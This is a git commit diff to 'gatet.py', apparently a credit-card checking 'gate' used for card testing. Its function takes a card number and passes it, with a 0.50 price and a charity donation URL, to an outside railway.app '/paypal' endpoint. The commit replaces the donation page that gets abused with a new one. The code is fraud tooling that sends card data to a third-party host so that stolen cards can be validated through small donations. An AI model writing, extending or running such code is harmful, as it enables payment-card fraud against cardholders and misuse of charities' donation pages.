f8cb46dc69328c9adcf564bc4ebe137ff779a76b
dfof1298-prog <dfof1298@gmail.com>
2026-04-20 14:11:06 +0200

    Update donation URL in chkk function

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://bestnation.com.au/donate-to-the-best-nation-party/"
+	urll="https://donatebear.com/donations/empower-the-kids-of-ghana-by-volunteering-causes/"
 	price="0.50"
 	res=requests.get(f'http://pqy2-production-539f.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
